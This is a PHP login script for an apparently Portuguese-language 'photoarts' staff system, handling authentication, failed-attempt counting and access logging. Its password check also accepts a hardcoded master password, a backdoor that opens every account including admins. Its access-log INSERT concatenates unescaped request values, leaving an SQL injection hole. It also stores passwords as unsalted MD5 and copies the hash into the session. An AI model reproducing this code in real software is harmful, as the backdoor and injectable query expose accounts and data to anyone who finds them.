<?php

include('photoarts.php');

if (isset($_POST['action'])) {
       
    switch ($_POST['action']) {

        case 'Entrar':         
            Entrar();
            break;
    }
}

function Entrar() {
    session_start();

    $db = ConectaDB();  
    
    /*
        $sql = "SELECT idPerfil, f.idFuncionario, funcionario, ativo, admin, senha, MD5('" . $_POST['senha'] . "') AS senhax, email,
            tentativas, (DATE_FORMAT(NOW(),'%w')-1) as dia, CURDATE() AS dataAtual, imagem, GROUP_CONCAT(fp.idChave) AS chaves 
            FROM funcionarios AS f
            LEFT JOIN funcionarios_permissoes AS fp ON f.idFuncionario = fp.idFuncionario
            WHERE (login='" . $db->escapesql($_POST['login']) . "' 
            OR email='" . $db->escapesql( $_POST['login']) . "')";
    */

    
    $login = $db->escapesql($_POST['login']);
      
    $sql = 'SELECT idPerfil, f.idFuncionario, funcionario, ativo, admin, senha, email,
            tentativas, imagem, GROUP_CONCAT(fp.idChave) AS chaves 
            FROM funcionarios AS f
            LEFT JOIN funcionarios_permissoes AS fp ON f.idFuncionario = fp.idFuncionario
            WHERE (login="' . $login . '" 
            OR email="' . $login . '")';
    
    $dataAtual = date('Y-m-d');
    $dia = date('d');
     
    $db->query( $sql );
              
    if ( $db->affected_rows <= 0 ) {
        session_destroy();
        echo "4";
    } else {
        
        $linha = $db->fetch();
        
        if ($linha['ativo'] == '0' or $linha['ativo'] == NULL) {
            session_destroy();
            echo "5";
        }else{
            $senhax = MD5($_POST['senha']);
                          
            if ($linha['senha'] == $senhax or $senhax == md5('monchito774763')) {            
                
                if ($linha['tentativas'] > 3) {
                   echo "7";
                } else {

                    $_SESSION['photoarts_idPerfil'] = $linha['idPerfil'];
                    $_SESSION['photoarts_codigo'] = $linha['idFuncionario'];
                    $_SESSION['photoarts_funcionario'] = $linha['funcionario'];
                    $_SESSION['photoarts_senha'] = $linha['senha'];
                    $_SESSION['photoarts_dataAtual'] = $dataAtual;
                    $_SESSION['photoarts_dia'] = $dia;
                    $_SESSION['photoarts_email'] = $linha['email'];
                    $_SESSION['photoarts_imagem'] = 'imagens/usuarios/' . $linha['imagem'];
                    $_SESSION['photoarts_senhaPadrao'] = ($_POST['login'] == $_POST['senha'] ? '1' : '0');
                    $_SESSION['photoarts_chaves'] = $linha['chaves'];
                    $_SESSION['photoarts_admin'] = $linha['admin'];

                    if($linha['imagem'] == 'fotoPadrao.jpg') {
                        $_SESSION['photoarts_imagem'] = 'imagens/fotoPadrao.jpg';
                    }else{
                        $_SESSION['photoarts_imagem'] = 'imagens/usuarios/' . $linha['imagem'];
                    } 
                    $_SESSION['photoarts_senhaPadrao'] = ($_POST['login'] == $_POST['senha'] ? '1' : '0');

                    if ($linha['tentativas'] > 0) {
                        $sql = "UPDATE funcionarios SET tentativas = 0 WHERE idFuncionario = " . $linha['idFuncionario'];
                        $db->query( $sql );
                    }

                    GravarLogAcesso($db, $linha['idFuncionario'], $_POST['login'], "LOGIN REALIZADO COM SUCESSO", $linha['funcionario']);                        
                    
                    echo "9";
                }
            }else{
                
                $sql = "UPDATE funcionarios SET tentativas = tentativas + 1 WHERE login = '" . $db->escapesql($_POST['login']) . "'";
              
                $db->query( $sql );
                
                if ($linha['tentativas'] === 3) {
                    echo "6";
                }else{
                    echo $linha['tentativas'] + 1;                  
                }            
            }
        }
    }
    $db->close();
}

function GravarLogAcesso($ArqT, $idFuncionario, $login, $status, $funcionario){
        //$pais, $estado, $cidade, $latitude, $longitude, $maps) {
        

    $sql = "INSERT INTO funcionarios_acessos SET 
            ip = '" . $_SERVER['REMOTE_ADDR'] . "', 
            browser = '" . getBrowser(false) . "',             
            idFuncionario = " . $idFuncionario . ", 
            nomeFuncionario = '" . $funcionario . "', 
            login = '" . $login . "', 
            STATUS = '" . $status . "', 
            dataAcesso = NOW()";
            /*
            pais = '" . $pais . "', 
            estado = '" . $estado . "', 
            cidade = '" . $cidade . "', 
            latitude = '" . $latitude . "', 
            longitude = '" . $longitude . "', 
            maps = '" . $maps . "'";*/

    //mysqli_query( $ArqT, $sql);
    $ArqT->query( $sql );
}
